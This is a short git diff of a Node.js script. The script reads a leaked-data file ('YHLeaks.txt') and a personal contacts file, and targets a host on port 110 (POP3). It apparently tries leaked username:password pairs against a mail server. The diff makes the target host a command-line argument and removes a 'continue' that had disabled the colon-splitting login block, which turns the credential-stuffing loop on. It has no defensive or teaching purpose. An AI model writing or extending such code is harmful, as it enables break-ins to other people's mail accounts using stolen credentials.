@@ -9,6 +9,8 @@ require('events').EventEmitter.defaultMaxListeners = 0
 var a = fs.readFileSync("./data/YHLeaks.txt").toString().split("\n"),
 	aN = fs.readFileSync("/Users/xiatian/Desktop/mytels.txt").toString(),
 	re = /FN:([^_]+)_([^\n\r]+)\n/gmi,g_oNm = {};
+
+var args = process.argv.splice(2);
 /*
 BEGIN:VCARD
 VERSION:3.0
@@ -30,7 +32,7 @@ while(aT = re.exec(aN))
 // console.log(g_oNm);
 
 //*////////////
-var host = "125.71.203.220", port = 110;
+var host = args[0], port = 110;
 function fnKg(n,s)
 {
 	var k = new Buffer(s,'utf8');
@@ -51,7 +53,7 @@ for(var i = 0; i < a.length; i++)
 		sTmp = sTmp.replace(/（/g, ".").replace(/）/g, "");
 		console.log(sTmp + fnKg(28,sTmp) + a[i]);
 	}
-	if(true)continue;
+	// if(true)continue;
 	+function(s)
 	{
 		var x = s.split(":");
